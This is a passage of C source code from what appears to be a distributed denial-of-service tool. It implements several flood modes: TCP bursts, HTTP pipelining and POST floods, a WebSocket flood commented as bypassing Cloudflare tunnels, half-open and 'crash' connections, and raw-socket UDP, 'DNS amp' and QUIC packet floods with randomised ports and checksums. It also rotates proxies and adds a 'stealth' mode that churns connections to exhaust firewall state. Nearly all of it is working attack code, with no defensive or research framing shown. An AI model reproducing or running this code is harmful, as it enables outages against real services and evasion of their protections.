                        if (now % 100 == 0) {
                            char junk = 0xFF;
                            send(conn->fd, &junk, 1, MSG_NOSIGNAL);
                        }
                    }
                }
            }
            
            else if (args.is_v11_chaos) {
                if (now - conn->last_pulse_ms >= 5) {
                    int cork = 1;
                    setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                    unsigned char chaos_buf[4096];
                    for(int i=0; i<4096; i++) chaos_buf[i] = fast_rand() % 256;
                    send(conn->fd, chaos_buf, 1400, MSG_NOSIGNAL | MSG_MORE);
                    send(conn->fd, chaos_buf + 512, 1400, MSG_NOSIGNAL | MSG_MORE);
                    send(conn->fd, chaos_buf + 1024, 1200, MSG_OOB | MSG_NOSIGNAL);
                    cork = 0;
                    setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                    thread_stats[thread_id].packets += 3;
                    thread_stats[thread_id].bytes += 4000;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v15_raw_amp || args.is_v19_tcp) {
                int cork = 1;
                setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                int ret;
                int batch_count = 0;
                // Stealth: shorter bursts then recycle connection for FW state exhaustion
                int max_batches = args.is_stealth ? 16 : 64;
                while (1) {
                    int s = 32768 + (fast_rand() % 32768);
                    int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
                    ret = send(conn->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL | MSG_MORE);
                    if (ret <= 0) {
                        if (errno == EAGAIN || errno == EWOULDBLOCK) {
                            conn->writable = 0;
                        }
                        break;
                    }
                    thread_stats[thread_id].packets++;
                    thread_stats[thread_id].tcp_packets++;
                    thread_stats[thread_id].bytes += ret;
                    batch_count++;
                    if (batch_count >= max_batches) {
                        cork = 0;
                        setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                        if (args.is_stealth) {
                            // Force RST: FW must process state teardown immediately
                            struct linger sl = {1, 0};
                            setsockopt(conn->fd, SOL_SOCKET, SO_LINGER, &sl, sizeof(sl));
                            goto cleanup; // Close + spawn new connection = state churn
                        }
                        cork = 1;
                        setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                        batch_count = 0;
                    }
                }
                cork = 0;
                setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
            }

            // === V20 WEBSOCKET SECURE FLOOD (CF TUNNEL BYPASS) ===
            else if (args.is_v20_ws && conn->ssl) {
                if (conn->payload_idx == 0) {
                    // Phase 1: Send WSS Upgrade request over TLS
                    char ws_key[25];
                    for (int i = 0; i < 22; i++) ws_key[i] = 'A' + (fast_rand() % 26);
                    ws_key[22] = '='; ws_key[23] = '='; ws_key[24] = 0;
                    
                    char upgrade[1024];
                    int ulen = snprintf(upgrade, sizeof(upgrade),
                        "GET / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "Upgrade: websocket\r\n"
                        "Connection: Upgrade\r\n"
                        "Sec-WebSocket-Key: %s\r\n"
                        "Sec-WebSocket-Version: 13\r\n"
                        "Origin: https://%s\r\n"
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\r\n"
                        "\r\n",
                        args.host, ws_key, args.host);
                    int ret = SSL_write(conn->ssl, upgrade, ulen);
                    if (ret > 0) {
                        conn->payload_idx = 1;
                        conn->last_pulse_ms = now;
                        thread_stats[thread_id].packets++;
                        thread_stats[thread_id].bytes += ret;
                    } else {
                        int err = SSL_get_error(conn->ssl, ret);
                        if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) goto cleanup;
                    }
                }
                else if (conn->payload_idx == 1) {
                    // Phase 2: Read upgrade response
                    char resp[4096];
                    int r = SSL_read(conn->ssl, resp, sizeof(resp));
                    if (r > 0) {
                        // Check if we got 101 (WS upgrade) or not
                        if (resp[9] == '1' && resp[10] == '0' && resp[11] == '1') {
                            conn->payload_idx = 2; // WS mode
                        } else {
                            conn->payload_idx = 3; // HTTP flood mode (CF rejected WS)
                        }
                    } else {
                        int err = SSL_get_error(conn->ssl, r);
                        if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) goto cleanup;
                    }
                    // Timeout 2s → go to HTTP flood
                    if (now - conn->last_pulse_ms > 2000) conn->payload_idx = 3;
                }
                else if (conn->payload_idx == 2) {
                    // Phase 3A: WS frame flood (got 101)
                    unsigned char ws_buf[16384];
                    int bp = 0;
                    int frame_count = 0;
                    
                    while (bp < 14000) {
                        int pl_size = 512 + (fast_rand() % 3584);
                        ws_buf[bp++] = 0x82;
                        if (pl_size < 126) {
                            ws_buf[bp++] = 0x80 | pl_size;
                        } else {
                            ws_buf[bp++] = 0x80 | 126;
                            ws_buf[bp++] = (pl_size >> 8) & 0xFF;
                            ws_buf[bp++] = pl_size & 0xFF;
                        }
                        unsigned int mask = fast_rand();
                        memcpy(ws_buf + bp, &mask, 4); bp += 4;
                        int offset = fast_rand() % (BUFFER_POOL_SIZE - pl_size);
                        unsigned char *src = (unsigned char*)(global_buffer_pool + offset);
                        unsigned char *mk = (unsigned char*)&mask;
                        for (int i = 0; i < pl_size; i++) ws_buf[bp++] = src[i] ^ mk[i % 4];
                        frame_count++;
                    }
                    
                    int ret = SSL_write(conn->ssl, ws_buf, bp);
                    if (ret > 0) {
                        thread_stats[thread_id].packets += frame_count;
                        thread_stats[thread_id].bytes += ret;
                        conn->sub_stage += frame_count;
                    } else {
                        int err = SSL_get_error(conn->ssl, ret);
                        if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) goto cleanup;
                    }
                    char drain[4096]; while (SSL_read(conn->ssl, drain, sizeof(drain)) > 0) {}
                    if (conn->sub_stage > 300 + (fast_rand() % 300)) goto cleanup;
                }
                else {
                    // Phase 3B: HTTP flood (CF rejected WS or timeout)
                    // Rapid POST/GET requests over persistent TLS connection
                    char http_buf[8192];
                    int hlen = snprintf(http_buf, sizeof(http_buf),
                        "POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: 1024\r\n"
                        "Connection: keep-alive\r\n"
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\r\n"
                        "Accept: text/html,application/xhtml+xml\r\n"
                        "\r\n",
                        args.host);
                    // Add 1024 bytes random body
                    int offset = fast_rand() % (BUFFER_POOL_SIZE - 1024);
                    memcpy(http_buf + hlen, global_buffer_pool + offset, 1024);
                    hlen += 1024;
                    
                    int ret = SSL_write(conn->ssl, http_buf, hlen);
                    if (ret > 0) {
                        thread_stats[thread_id].packets++;
                        thread_stats[thread_id].bytes += ret;
                        conn->sub_stage++;
                    } else {
                        int err = SSL_get_error(conn->ssl, ret);
                        if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) goto cleanup;
                    }
                    char drain[4096]; while (SSL_read(conn->ssl, drain, sizeof(drain)) > 0) {}
                    if (conn->sub_stage > 100 + (fast_rand() % 100)) goto cleanup;
                }
            }
            
            else if (args.is_v7_pipe) {
                if (now - conn->last_pulse_ms >= 50 + conn->jitter_ms) { 
                    
                    
                    char pipe_buffer[16384] = {0};
                    int bp = 0;
                    int req_count = 0;
                    
                    
                    for (int i = 0; i < 80; i++) {
                        
                        int len = snprintf(pipe_buffer + bp, 16384 - bp, 
                            "GET /?rand=%d HTTP/1.1\r\n%s", 
                            fast_rand() % 999999, conn->randomized_headers);
                        bp += len;
                        req_count++;
                        if (bp >= 15800) break; 
                    }
                    
                    if (conn->ssl) SSL_write(conn->ssl, pipe_buffer, bp);
                    else {
                        int cork = 1;
                        setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                        send(conn->fd, pipe_buffer, bp, MSG_NOSIGNAL);
                        cork = 0;
                        setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                    }
                    
                    thread_stats[thread_id].packets += req_count;
                    thread_stats[thread_id].bytes += bp;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_crash_mode) {
                 if (now - conn->last_pulse_ms >= 5) { 
                     int s = 64 + (rand() % 128); 
                     
                     send(conn->fd, global_buffer_pool + (rand() % (BUFFER_POOL_SIZE - s)), s, MSG_NOSIGNAL);
                     thread_stats[thread_id].packets++;
                     conn->last_pulse_ms = now;
                 }
            }
            
            else if (now - conn->last_pulse_ms >= PULSE_INTERVAL_MS + conn->jitter_ms) {
                if (args.is_half_open) {
                    send(conn->fd, "\0", 1, MSG_NOSIGNAL); 
                } else {
                    int s = 512 + (rand() % 1024);
                    send(conn->fd, global_buffer_pool + (rand() % (BUFFER_POOL_SIZE - s)), s, MSG_NOSIGNAL);
                    thread_stats[thread_id].packets++;
                }
                conn->last_pulse_ms = now;
            }
        }
    }
    return;

cleanup:
    if (conn) {
        int socket_error = 0;
        socklen_t len = sizeof(socket_error);
        if (getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &socket_error, &len) == 0 && socket_error != 0) {
            errno = socket_error;
        }
        // Silenced to avoid performance bottlenecks caused by log spam under high stress rates
    }
    thread_stats[thread_id].connect_fail++;
    if (conn) {
        if (conn->prev) {
            conn->prev->next = conn->next;
        } else {
            active_conns_list = conn->next;
        }
        if (conn->next) {
            conn->next->prev = conn->prev;
        }

        if (conn->proxy) {
            __sync_fetch_and_add(&conn->proxy->fail_count, 1);
            conn->proxy->last_fail_time = get_ms();
            if (conn->proxy->fail_count >= 50000) {
                conn->proxy->is_dead = 1;
            }
            if (conn->proxy->active_conns > 0) {
                __sync_fetch_and_sub(&conn->proxy->active_conns, 1);
                __sync_fetch_and_sub(&global_proxy_active_conns, 1);
            }
        } else {
            if (global_active_conns > 0) __sync_fetch_and_sub(&global_active_conns, 1);
        }
        if (conn->ssl) {
            SSL_free(conn->ssl);
        }
        if (conn->fd > 0) {
            close(conn->fd);
        }
        if (conn->client_udp_fd > 0) {
            close(conn->client_udp_fd);
        }
        free(conn);
    }
}

static int get_total_active_conns() {
    return global_active_conns + global_proxy_active_conns;
}

static Proxy *select_alive_proxy() {
    if (proxy_count <= 0) return NULL;
    long long now = get_ms();
    for (int attempt = 0; attempt < 20; attempt++) {
        int idx = rand() % proxy_count;
        Proxy *p = &proxies[idx];
        if (p->is_dead) {
            if (now - p->last_fail_time > 60000) {
                p->is_dead = 0;
                p->fail_count = 0;
            } else {
                continue;
            }
        }
        if (p->active_conns >= MAX_CONNS_PER_PROXY) continue;
        return p;
    }
    for (int i = 0; i < proxy_count; i++) {
        if (proxies[i].active_conns < MAX_CONNS_PER_PROXY && !proxies[i].is_dead) {
            return &proxies[i];
        }
    }
    return NULL;
}

int spawn_connection(int epoll_fd, int thread_id) {
    if (get_total_active_conns() >= args.rate) {
        return 0;
    }
    int fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (fd == -1) return 0;

    int val = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &val, sizeof(val));
    
    int syn_retries = 4;
    setsockopt(fd, IPPROTO_TCP, TCP_SYNCNT, &syn_retries, sizeof(syn_retries));
    
    int ttl = 55 + (fast_rand() % 10);
    setsockopt(fd, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));
    int mss = 536 + (fast_rand() % 925);
    setsockopt(fd, IPPROTO_TCP, TCP_MAXSEG, &mss, sizeof(mss));
    
    if (args.is_v15_raw_amp || args.is_v19_tcp) {
        int sndbuf = 1048576;
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    }
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    Proxy *p = NULL;
    int is_udp = 0;
    if (args.is_v19_tcp && proxy_count > 0) {
        p = select_alive_proxy();
        if (!p) { close(fd); return 0; } // v19 REQUIRES proxy
    } else if (args.is_hybrid_v15 && proxy_count > 0) {
        p = select_alive_proxy();
        if ((fast_rand() % 100) < 40) {
            is_udp = 1;
        }
    } else if (!args.is_v15_raw_amp || (fast_rand() % 100 < 30)) {
        p = select_alive_proxy();
    }
    
    if (!p && proxy_count > 0 && (!args.is_v15_raw_amp) && (!args.is_hybrid_v15) && (!args.is_v19_tcp) && (!args.is_stealth) && (!args.is_v20_ws)) {
        close(fd);
        return 0;
    }
    
    if (!p) {
        if (__sync_fetch_and_add(&global_active_conns, 0) >= args.rate) {
            close(fd);
            return 0;
        }
    }
    
    int target_port = args.port;
    if (args.is_v3_killer && num_open_ports > 0) {
        target_port = open_ports[rand() % num_open_ports];
    }

    if (p) {
        addr.sin_port = htons(p->port);
        inet_pton(AF_INET, p->host, &addr.sin_addr);
        __sync_fetch_and_add(&p->active_conns, 1);
        __sync_fetch_and_add(&global_proxy_active_conns, 1);
    } else {
        addr.sin_port = htons(target_port);
        inet_pton(AF_INET, args.target_ip, &addr.sin_addr);
        __sync_fetch_and_add(&global_active_conns, 1);
    }

    Connection *conn = calloc(1, sizeof(Connection));
    if (!conn) {
        if (p) { __sync_fetch_and_sub(&p->active_conns, 1); __sync_fetch_and_sub(&global_proxy_active_conns, 1); }
        else __sync_fetch_and_sub(&global_active_conns, 1);
        close(fd);
        return 0;
    }
    conn->fd = fd; conn->thread_id = thread_id; conn->proxy = p;
    conn->target_port = target_port;
    conn->stage = STAGE_CONNECTING;
    conn->writable = 0;
    conn->last_pulse_ms = get_ms();
    conn->jitter_ms = (rand() % 15) - 7;
    conn->is_udp_assoc = is_udp;
    conn->client_udp_fd = -1;
    if (!args.is_v15_raw_amp && !args.is_hybrid_v15) {
        generate_random_headers(conn->randomized_headers, conn->randomized_ua, args.host);
    }

    if (args.is_v14_phantom && !p) {
        unsigned char fastopen_data[] = "GET / HTTP/1.1\r\n\r\n";
        sendto(fd, fastopen_data, strlen((char*)fastopen_data), MSG_FASTOPEN, (struct sockaddr *)&addr, sizeof(addr));
    } else {
        int ret = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
        if (ret < 0 && errno != EINPROGRESS) {
            LOG_ERR("DEBUG connect() failed: fd=%d errno=%d (%s) target=%s:%d", fd, errno, strerror(errno), args.target_ip, target_port);
            close(fd);
            if (conn->proxy && conn->proxy->active_conns > 0) { __sync_fetch_and_sub(&conn->proxy->active_conns, 1); __sync_fetch_and_sub(&global_proxy_active_conns, 1); }
            if (!conn->proxy) __sync_fetch_and_sub(&global_active_conns, 1);
            free(conn);
            return 0;
        }
    }

    struct epoll_event ev = {EPOLLOUT | EPOLLIN | EPOLLET, {.ptr = conn}};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
        LOG_ERR("DEBUG epoll_ctl ADD failed: fd=%d errno=%d (%s)", fd, errno, strerror(errno));
        close(fd);
        if (conn->proxy && conn->proxy->active_conns > 0) { __sync_fetch_and_sub(&conn->proxy->active_conns, 1); __sync_fetch_and_sub(&global_proxy_active_conns, 1); }
        if (!conn->proxy) __sync_fetch_and_sub(&global_active_conns, 1);
        free(conn);
        return 0;
    }

    conn->next = active_conns_list;
    if (active_conns_list) {
        active_conns_list->prev = conn;
    }
    active_conns_list = conn;
    return 1;
}

void *worker_thread(void *arg) {
    int tid = *(int *)arg; free(arg);
    
    unsigned int bin_target_ip = 0;
    inet_pton(AF_INET, args.target_ip, &bin_target_ip);
    unsigned short bin_target_port = htons(args.port);
    
    xorshift_init((unsigned int)(tid + 1) * 2654435761u + (unsigned int)time(NULL));
    

    if (args.is_v16_dns_amp || args.is_v18_quic) {
        // V16 OPTIMIZED: AF_PACKET + QDISC_BYPASS + 256 batch + 128 burst + dual socket
        char iface[32]={0};
        get_default_interface(iface,sizeof(iface));
        int ifindex = iface[0] ? if_nametoindex(iface) : 0;
        
        unsigned char src_mac[6]={0};
        unsigned char gw_mac[6]={0};
        int use_afp = 0;
        if (iface[0]) {
            char path[128]; snprintf(path,sizeof(path),"/sys/class/net/%s/address",iface);
            FILE *f=fopen(path,"r"); if(f){ int m[6];
              if(fscanf(f,"%x:%x:%x:%x:%x:%x",&m[0],&m[1],&m[2],&m[3],&m[4],&m[5])==6)
                for(int i=0;i<6;i++) src_mac[i]=m[i];
              fclose(f);}
            unsigned int gw_ip=0;
            FILE *fr=fopen("/proc/net/route","r");
            if(fr){char ln[256];
              while(fgets(ln,sizeof(ln),fr)){char ri[32];unsigned long rd,rg;
                if(sscanf(ln,"%31s %lx %lx",ri,&rd,&rg)==3&&rd==0&&rg!=0){
                  gw_ip=(unsigned int)rg;break;}}
              fclose(fr);}
            if(gw_ip){struct in_addr ga;ga.s_addr=gw_ip;
              char cmd[128];snprintf(cmd,sizeof(cmd),"ping -c1 -W1 %s>/dev/null 2>&1",inet_ntoa(ga));
              if(system(cmd)){} usleep(50000);
              FILE *fa=fopen("/proc/net/arp","r");
              if(fa){char ln[256];if(fgets(ln,sizeof(ln),fa)){}
                while(fgets(ln,sizeof(ln),fa)){char ai[64],am[64];int t,fl;
                  if(sscanf(ln,"%63s 0x%x 0x%x %17s",ai,&t,&fl,am)>=4&&
                     inet_addr(ai)==gw_ip){
                    int m[6];if(sscanf(am,"%x:%x:%x:%x:%x:%x",
                                       &m[0],&m[1],&m[2],&m[3],&m[4],&m[5])==6)
                      for(int i=0;i<6;i++) gw_mac[i]=m[i];
                    break;}}
                fclose(fa);}}
        }
        
        int fd_send = -1, fd_send2 = -1;
        int raw_fd = -1;
        int udp_fd = -1;
        
        // Tier 1: AF_PACKET + QDISC_BYPASS (fastest)
        if (iface[0] && ifindex > 0) {
            fd_send = init_afpacket_socket(iface);
            fd_send2 = init_afpacket_socket(iface);
            if (fd_send >= 0 && fd_send2 >= 0) {
                use_afp = 1;
                LOG_INFO("T%d: V16 AF_PACKET mode, fd=%d/%d", tid, fd_send, fd_send2);
            } else {
                if (fd_send >= 0) close(fd_send);
                if (fd_send2 >= 0) close(fd_send2);
                fd_send = fd_send2 = -1;
            }
        }
        // Tier 2: SOCK_RAW (medium)
        if (!use_afp) {
            raw_fd = init_raw_socket();
            if (raw_fd >= 0) {
                int sndbuf = 64*1024*1024;
                setsockopt(raw_fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
                LOG_INFO("T%d: V16 RAW_SOCKET mode, fd=%d", tid, raw_fd);
            }
        }
        // Tier 3: SOCK_DGRAM (always works)
        udp_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (udp_fd >= 0) {
            int sndbuf = 64*1024*1024;
            setsockopt(udp_fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        }
        
        if (!use_afp && raw_fd < 0 && udp_fd < 0) {
            LOG_ERR("T%d: V16 no usable socket", tid);
            return NULL;
        }
        
        struct sockaddr_ll dst_sll={0};
        if (use_afp) {
            dst_sll.sll_family=AF_PACKET; dst_sll.sll_ifindex=ifindex;
            dst_sll.sll_halen=6; memcpy(dst_sll.sll_addr,gw_mac,6);
            dst_sll.sll_protocol=htons(ETH_P_IP);
        }
        
        unsigned int cached_my_ip = get_local_ip();
        unsigned int cached_d_ip = bin_target_ip;
        struct sockaddr_in target_addr;
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(args.port);
        target_addr.sin_addr.s_addr = cached_d_ip;
        
        long long start_ms = get_ms();
        
        while (1) {
            if (args.is_v16_dns_amp) {
                #define V16_BATCH 256
                #define V16_ETH 14
                #define V16_BURSTS 128
                int udp_payload_len = use_afp ? (1500 - sizeof(struct iphdr) - sizeof(struct udphdr)) : (1500 - sizeof(struct iphdr) - sizeof(struct udphdr));
                int ip_pkt_len = sizeof(struct iphdr) + sizeof(struct udphdr) + udp_payload_len;
                int frame_len = use_afp ? (V16_ETH + ip_pkt_len) : ip_pkt_len;
                
                static __thread unsigned char raw_pkts[V16_BATCH][1514] __attribute__((aligned(64)));
                static __thread struct mmsghdr msgs[V16_BATCH];
                static __thread struct iovec iovs[V16_BATCH];
                static __thread int v16_inited = 0;
                static __thread unsigned int v16_udp_base_sum = 0;
                static __thread int v16_ip_off = 0; // offset to IP header
                
                if (!v16_inited) {
                    v16_ip_off = use_afp ? V16_ETH : 0;
                    
                    unsigned char tpl[1514] __attribute__((aligned(64)));
                    memset(tpl, 0, sizeof(tpl));
                    
                    if (use_afp) {
                        // Ethernet header
                        memcpy(tpl, gw_mac, 6);      // dst MAC
                        memcpy(tpl+6, src_mac, 6);    // src MAC
                        tpl[12] = 0x08; tpl[13] = 0x00; // EtherType = IPv4
                    }
                    
                    unsigned char udp_pay[1500];
                    for (int k = 0; k < udp_payload_len; k += 8)
                        *((unsigned long long*)(udp_pay + k)) = 0xAAAAAAAAAAAAAAAAULL ^ (fast_rand() * 0x0101010101010101ULL);
                    int out_len = 0;
                    craft_udp_packet(tpl + v16_ip_off, &out_len, cached_my_ip, cached_d_ip, 12345, args.port, udp_pay, udp_payload_len);
                    
                    struct iphdr *tiph = (struct iphdr *)(tpl + v16_ip_off);
                    struct udphdr *tudph = (struct udphdr *)(tpl + v16_ip_off + sizeof(struct iphdr));
                    unsigned char *tpdata = tpl + v16_ip_off + sizeof(struct iphdr) + sizeof(struct udphdr);
                    tudph->source = 0; tudph->check = 0;
                    
                    v16_udp_base_sum = 0;
                    v16_udp_base_sum += (tiph->saddr & 0xFFFF) + (tiph->saddr >> 16);
                    v16_udp_base_sum += (tiph->daddr & 0xFFFF) + (tiph->daddr >> 16);
                    v16_udp_base_sum += htons(IPPROTO_UDP);
                    v16_udp_base_sum += tudph->len;
                    v16_udp_base_sum += tudph->dest;
                    unsigned short *tps = (unsigned short *)tpdata;
                    for (int k = 0; k < udp_payload_len / 2; k++) v16_udp_base_sum += tps[k];
                    if (udp_payload_len % 2) v16_udp_base_sum += htons(((unsigned short)tpdata[udp_payload_len - 1]) << 8);
                    
                    for (int b = 0; b < V16_BATCH; b++) {
                        memcpy(raw_pkts[b], tpl, frame_len);
                        iovs[b].iov_len = frame_len;
                        iovs[b].iov_base = raw_pkts[b];
                        msgs[b].msg_hdr.msg_iov = &iovs[b];
                        msgs[b].msg_hdr.msg_iovlen = 1;
                        if (use_afp) {
                            msgs[b].msg_hdr.msg_name = &dst_sll;
                            msgs[b].msg_hdr.msg_namelen = sizeof(dst_sll);
                        } else {
                            msgs[b].msg_hdr.msg_name = &target_addr;
                            msgs[b].msg_hdr.msg_namelen = sizeof(target_addr);
                        }
                    }
                    v16_inited = 1;
                    LOG_INFO("T%d: V16 init done, batch=%d bursts=%d frame=%d afp=%d", tid, V16_BATCH, V16_BURSTS, frame_len, use_afp);
                }
                
                // Hot send loop: 128 bursts × 256 packets = 32768 packets/round
                int cur_fd = use_afp ? fd_send : (raw_fd >= 0 ? raw_fd : udp_fd);
                int alt_fd = use_afp ? fd_send2 : cur_fd;
                unsigned long long round_sent = 0, round_bytes = 0;
                
                for (int burst = 0; burst < V16_BURSTS; burst++) {
                    // Randomize source port + IP ID per packet with differential checksum
                    for (int b = 0; b < V16_BATCH; b++) {
                        struct iphdr *iph = (struct iphdr *)(raw_pkts[b] + v16_ip_off);
                        struct udphdr *udph = (struct udphdr *)(raw_pkts[b] + v16_ip_off + sizeof(struct iphdr));
                        unsigned short sp = htons(1024 + (fast_rand() % 60000));
                        udph->source = sp;
                        unsigned int cs = v16_udp_base_sum + sp;
                        cs = (cs & 0xFFFF) + (cs >> 16); cs = (cs & 0xFFFF) + (cs >> 16);
                        udph->check = (unsigned short)~cs;
                        if (udph->check == 0) udph->check = 0xFFFF;
                        // Randomize IP ID with differential IP checksum
                        unsigned short old_id = iph->id;
                        unsigned short new_id = htons(fast_rand() & 0xFFFF);
                        unsigned int ip_diff = (~old_id & 0xFFFF) + (new_id & 0xFFFF);
                        unsigned int ip_ck = (~iph->check & 0xFFFF) + ip_diff;
                        ip_ck = (ip_ck >> 16) + (ip_ck & 0xFFFF); ip_ck += (ip_ck >> 16);
                        iph->check = (unsigned short)~ip_ck;
                        iph->id = new_id;
                    }
                    
                    int sent = sendmmsg(cur_fd, msgs, V16_BATCH, MSG_NOSIGNAL);
                    if (sent > 0) {
                        round_sent += sent;
                        for (int b = 0; b < sent; b++) round_bytes += msgs[b].msg_len;
                    } else if (errno == ENOBUFS || errno == EAGAIN) {
                        cur_fd = (cur_fd == (use_afp ? fd_send : cur_fd)) ? alt_fd : (use_afp ? fd_send : cur_fd);
                        usleep(1);
                    }
                }
                thread_stats[tid].packets += round_sent;
                thread_stats[tid].bytes += round_bytes;
            } 
            else if (args.is_v18_quic) {
                #define V18Q_BATCH 64
                static __thread unsigned char quic_pkts[V18Q_BATCH][1500] __attribute__((aligned(32)));
                static __thread struct mmsghdr msgs_quic[V18Q_BATCH];
                static __thread struct iovec iovs_quic[V18Q_BATCH];
                static __thread int quic_inited = 0;
                static __thread int quic_pkt_len = 0;
                static __thread unsigned int quic_base_sum = 0;
                
                if (!quic_inited) {
                    int udp_payload_len = 1200; // QUIC typical initial packet size
                    quic_pkt_len = sizeof(struct iphdr) + sizeof(struct udphdr) + udp_payload_len;
                    unsigned char qtpl[1500] __attribute__((aligned(32)));
                    unsigned char qpay[1500];
                    for(int i=0; i<udp_payload_len; i++) qpay[i] = fast_rand() & 0xFF;
                    qpay[0] = 0xC3; // QUIC Initial Header
                    *((unsigned int*)(qpay+1)) = htonl(0x00000001); // Version 1
                    qpay[5] = 0x08; // DCID Length
                    
                    int out_len = 0;
                    craft_udp_packet(qtpl, &out_len, cached_my_ip, cached_d_ip, 12345, args.port, qpay, udp_payload_len);
                    
                    struct iphdr *tiph = (struct iphdr *)qtpl;
                    struct udphdr *tudph = (struct udphdr *)(qtpl + sizeof(struct iphdr));
                    unsigned char *tpdata = qtpl + sizeof(struct iphdr) + sizeof(struct udphdr);
                    tudph->source = 0; tudph->check = 0;
                    
                    quic_base_sum = 0;
                    quic_base_sum += (tiph->saddr & 0xFFFF) + (tiph->saddr >> 16);
                    quic_base_sum += (tiph->daddr & 0xFFFF) + (tiph->daddr >> 16);
                    quic_base_sum += htons(IPPROTO_UDP);
                    quic_base_sum += tudph->len;
                    quic_base_sum += tudph->dest;
                    unsigned short *tps = (unsigned short *)tpdata;
                    for (int k = 0; k < udp_payload_len / 2; k++) quic_base_sum += tps[k];
                    if (udp_payload_len % 2) quic_base_sum += htons(((unsigned short)tpdata[udp_payload_len - 1]) << 8);
                    
                    for (int b = 0; b < V18Q_BATCH; b++) {
                        memcpy(quic_pkts[b], qtpl, quic_pkt_len);
                        iovs_quic[b].iov_len = quic_pkt_len;
                        iovs_quic[b].iov_base = quic_pkts[b];
                        msgs_quic[b].msg_hdr.msg_iov = &iovs_quic[b];
                        msgs_quic[b].msg_hdr.msg_iovlen = 1;
                        msgs_quic[b].msg_hdr.msg_name = &target_addr;
                        msgs_quic[b].msg_hdr.msg_namelen = sizeof(target_addr);
                    }
                    quic_inited = 1;
                }
                
                for (int b = 0; b < V18Q_BATCH; b++) {
                    struct udphdr *udph = (struct udphdr *)(quic_pkts[b] + sizeof(struct iphdr));
                    unsigned short sp = htons(1024 + (fast_rand() % 60000));
                    udph->source = sp;
                    // Randomize DCID
                    unsigned char *qdata = quic_pkts[b] + sizeof(struct iphdr) + sizeof(struct udphdr);
                    *((unsigned long long*)(qdata+6)) = fast_rand() * 0x0101010101010101ULL;
                    
                    unsigned int cs = quic_base_sum + sp;
                    cs = (cs & 0xFFFF) + (cs >> 16); cs = (cs & 0xFFFF) + (cs >> 16);
                    udph->check = (unsigned short)~cs;
                    if (udph->check == 0) udph->check = 0xFFFF;
                }
                
                int sent_count = sendmmsg(raw_fd, msgs_quic, V18Q_BATCH, MSG_NOSIGNAL);
                if (sent_count > 0) {
                    for (int b = 0; b < sent_count; b++) {
                        thread_stats[tid].packets++;
                        thread_stats[tid].bytes += msgs_quic[b].msg_len;
                    }
                }
            }
            else if (args.is_v18_tls) {
                #undef V18T_BATCH
                #define V18T_BATCH 256
                static __thread unsigned char tls_pkts[V18T_BATCH][1500] __attribute__((aligned(32)));
                static __thread struct mmsghdr msgs_tls[V18T_BATCH];
                static __thread struct iovec iovs_tls[V18T_BATCH];
                static __thread int tls_inited = 0;
                static __thread int tls_pkt_len = 0;
                static __thread unsigned int tls_base_sum = 0;
                static __thread unsigned int ip_base_sum = 0;
                
                if (!tls_inited) {
                    int tls_payload_len = 1460;
                    tls_pkt_len = sizeof(struct iphdr) + 20 + tls_payload_len;
                    unsigned char ttpl[1500] __attribute__((aligned(32)));
                    memset(ttpl, 0, sizeof(struct iphdr) + 20);
                    
                    // Build IP header
                    struct iphdr *tiph = (struct iphdr *)ttpl;
                    tiph->ihl = 5; tiph->version = 4;
                    tiph->tot_len = htons(tls_pkt_len);
                    tiph->frag_off = htons(0x4000);
                    tiph->ttl = 64;
                    tiph->protocol = IPPROTO_TCP;
                    tiph->saddr = cached_my_ip;
                    tiph->daddr = cached_d_ip;
                    
                    // Build TCP header — doff=5, PSH+ACK
                    struct tcphdr *ttcph = (struct tcphdr *)(ttpl + sizeof(struct iphdr));
                    ttcph->doff = 5;
                    ttcph->psh = 1; ttcph->ack = 1;
                    ttcph->dest = htons(args.port);
                    ttcph->window = htons(65535);
                    
                    // Build pure random payload (no TLS signature)
                    unsigned char *tpay = ttpl + sizeof(struct iphdr) + 20;
                    for(int i=0; i<tls_payload_len; i++) tpay[i] = fast_rand() & 0xFF;
                    
                    // Precompute IP checksum base (excluding id, ttl, check)
